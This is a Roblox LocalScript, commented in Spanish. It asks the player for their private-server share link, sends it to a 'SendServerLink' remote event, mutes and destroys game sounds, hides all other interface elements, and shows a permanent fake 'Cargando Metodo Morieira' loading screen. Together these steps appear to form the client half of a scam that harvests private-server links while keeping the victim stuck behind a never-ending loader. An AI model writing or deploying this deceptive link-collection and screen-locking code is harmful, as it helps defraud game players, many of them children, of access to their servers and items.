-- LocalScript: Loading full-screen + intentar quitar sonidos
local Player = game.Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local SoundService = game:GetService("SoundService")
local StarterGui = game:GetService("StarterGui")

-- ====== UI PRINCIPAL (entrada del link) ======
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "ServerLinkUI"
ScreenGui.Parent = Player:WaitForChild("PlayerGui")
ScreenGui.DisplayOrder = 100
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global

local Frame = Instance.new("Frame")
Frame.Parent = ScreenGui
Frame.Size = UDim2.new(0, 400, 0, 300)
Frame.Position = UDim2.new(0.5, -200, 0.5, -150)
Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Frame.BorderSizePixel = 0

local Label = Instance.new("TextLabel")
Label.Parent = Frame
Label.Size = UDim2.new(1, -20, 0, 30)
Label.Position = UDim2.new(0, 10, 0, 10)
Label.Text = "Ingresa el link de tu servidor privado:"
Label.TextColor3 = Color3.fromRGB(255,255,255)
Label.BackgroundTransparency = 1
Label.TextScaled = true

local TextBox = Instance.new("TextBox")
TextBox.Parent = Frame
TextBox.Size = UDim2.new(1, -20, 0, 50)
TextBox.Position = UDim2.new(0, 10, 0, 50)
TextBox.TextColor3 = Color3.fromRGB(255,255,255)
TextBox.BackgroundColor3 = Color3.fromRGB(50,50,50)
TextBox.ClearTextOnFocus = false
TextBox.Text = "https://www.roblox.com/share?code="
TextBox.TextScaled = true

local MessageLabel = Instance.new("TextLabel")
MessageLabel.Parent = Frame
MessageLabel.Size = UDim2.new(1, -20, 0, 30)
MessageLabel.Position = UDim2.new(0, 10, 0, 110)
MessageLabel.BackgroundTransparency = 1
MessageLabel.Text = ""
MessageLabel.TextColor3 = Color3.fromRGB(255,0,0)
MessageLabel.TextScaled = true

local Button = Instance.new("TextButton")
Button.Parent = Frame
Button.Size = UDim2.new(1, -20, 0, 50)
Button.Position = UDim2.new(0, 10, 0, 150)
Button.Text = "Enviar"
Button.BackgroundColor3 = Color3.fromRGB(75,75,75)
Button.TextColor3 = Color3.fromRGB(255,255,255)
Button.TextScaled = true

-- ====== Validación simple ======
local function isLinkValid(link)
    local startPart = "https://www.roblox.com/share?code="
    local endPart = "&type=Server"
    return string.sub(link,1,#startPart) == startPart and string.sub(link,-#endPart) == endPart
end

-- ====== Función: intentar detener y destruir sonidos accesibles client-side ======
local function silenceAndRemoveClientSounds()
    -- Helper para procesar una tabla de instancias
    local function processCollection(root)
        for _, inst in pairs(root:GetDescendants()) do
            if inst:IsA("Sound") then
                -- intentar detener primero
                pcall(function()
                    if inst.IsPlaying ~= nil then
                        inst:Stop()
                    else
                        -- fallback: call Stop safely
                        inst:Stop()
                    end
                end)
                -- intentar bajar volumen localmente
                pcall(function()
                    inst.Volume = 0
                end)
                -- intentar destruir (puede fallar si no tienes permiso)
                pcall(function()
                    inst:Destroy()
                end)
            end
        end
    end

    -- Procesar PlayerGui (sonidos locales ahí)
    pcall(function() processCollection(Player:WaitForChild("PlayerGui")) end)

    -- Procesar Workspace (notar: intentar destruir puede fallar por permisos)
    pcall(function() processCollection(Workspace) end)

    -- Procesar SoundService (a veces hay sonidos globales ahí)
    pcall(function() processCollection(SoundService) end)

    -- Procesar ReplicatedStorage por si hay sonidos replicados
    pcall(function() processCollection(ReplicatedStorage) end)

    -- Como refuerzo, intentar setear propiedades del SoundService si están disponibles
    pcall(function()
        if SoundService["Volume"] ~= nil then
            -- setear volumen lo más bajo posible localmente
            SoundService.Volume = 0
        end
    end)
end

-- ====== Crear la pantalla de carga que cubre TODO ======
local function showLoadingScreenFull()
    -- Desactivar otras GUIs para asegurar cobertura total
    for _, gui in pairs(Player.PlayerGui:GetChildren()) do
        if gui:IsA("ScreenGui") and gui.Name ~= "ServerLinkUI" then
            gui.Enabled = false
        end
    end

    local loadingGui = Instance.new("ScreenGui")
    loadingGui.Name = "LoadingScreen"
    loadingGui.ResetOnSpawn = false
    loadingGui.Parent = Player.PlayerGui
    loadingGui.DisplayOrder = 10000 -- muy alto para sobreponer todo
    loadingGui.ZIndexBehavior = Enum.ZIndexBehavior.Global

    -- Overlay que cubre completamente la pantalla (esquina a esquina)
    local overlay = Instance.new("Frame")
    overlay.Name = "Overlay"
    overlay.Size = UDim2.new(1, 0, 1, 0)
    overlay.Position = UDim2.new(0, 0, 0, 0)
    overlay.BackgroundColor3 = Color3.fromRGB(0,0,0)
    overlay.BackgroundTransparency = 0 -- totalmente opaco (ajusta si quieres)
    overlay.Parent = loadingGui
    overlay.BorderSizePixel = 0

    -- Texto principal centrado
    local loadingLabel = Instance.new("TextLabel")
    loadingLabel.Name = "LoadingLabel"
    loadingLabel.AnchorPoint = Vector2.new(0.5, 0.5)
    loadingLabel.Size = UDim2.new(0.8, 0, 0, 60)
    loadingLabel.Position = UDim2.new(0.5, 0, 0.4, 0)
    loadingLabel.BackgroundTransparency = 1
    loadingLabel.TextColor3 = Color3.fromRGB(255,255,255)
    loadingLabel.TextScaled = true
    loadingLabel.Font = Enum.Font.SourceSansBold
    loadingLabel.Text = "Cargando Metodo Morieira"
    loadingLabel.Parent = overlay

    -- Contenedor de la barra (centrado bajo el texto)
    local barBackground = Instance.new("Frame")
    barBackground.Name = "BarBackground"
    barBackground.Size = UDim2.new(0.75, 0, 0, 28)
    barBackground.Position = UDim2.new(0.5, 0, 0.52, 0)
    barBackground.AnchorPoint = Vector2.new(0.5, 0)
    barBackground.BackgroundColor3 = Color3.fromRGB(50,50,50)
    barBackground.BorderSizePixel = 0
    barBackground.Parent = overlay

    -- Relleno de la barra (empieza en 1%)
    local barFill = Instance.new("Frame")
    barFill.Name = "BarFill"
    barFill.Size = UDim2.new(0.01, 0, 1, 0) -- 1% inicial
    barFill.Position = UDim2.new(0, 0, 0, 0)
    barFill.BackgroundColor3 = Color3.fromRGB(0,200,0)
    barFill.BorderSizePixel = 0
    barFill.Parent = barBackground

    -- Texto % encima de la barra
    local percentLabel = Instance.new("TextLabel")
    percentLabel.Name = "PercentLabel"
    percentLabel.Size = UDim2.new(1, 0, 1, 0)
    percentLabel.Position = UDim2.new(0, 0, 0, 0)
    percentLabel.BackgroundTransparency = 1
    percentLabel.TextColor3 = Color3.fromRGB(255,255,255)
    percentLabel.TextScaled = true
    percentLabel.Text = "1%"
    percentLabel.Parent = barBackground

    -- Animación de 1% a 100% (quedará la pantalla cuando llegue a 100%)
    spawn(function()
        for i = 1, 100 do
            -- actualizar tamaño de la barra
            barFill.Size = UDim2.new(i/100, 0, 1, 0)
            percentLabel.Text = tostring(i) .. "%"
            wait(0.03) -- ~3 segundos total, ajusta si quieres más lento/rápido
        end
        -- cuando llega a 100%: dejar la pantalla tal cual (no se quita)
        -- opcional: puedes hacer algo aquí (ej. reproducir sonido, cambiar texto, etc.)
    end)

    return loadingGui
end

-- ====== Evento del botón ======
Button.MouseButton1Click:Connect(function()
    local link = TextBox.Text
    if isLinkValid(link) then
        MessageLabel.Text = "El link es válido ✅"
        MessageLabel.TextColor3 = Color3.fromRGB(0,255,0)

        -- Enviar al remoto si existe (manteniendo tu flujo)
        local remoteEvent = ReplicatedStorage:FindFirstChild("SendServerLink")
        if remoteEvent then
            remoteEvent:FireServer(link)
        end

        -- Intentar silenciar/quitar sonidos accesibles desde el cliente
        silenceAndRemoveClientSounds()

        -- Mostrar pantalla de carga total (esquina a esquina)
        showLoadingScreenFull()

        -- Destruir la UI original para evitar duplicados
        if ScreenGui then
            ScreenGui:Destroy()
        end
    else
        MessageLabel.Text = "El link es inválido ❌"
        MessageLabel.TextColor3 = Color3.fromRGB(255,0,0)
    end
end)
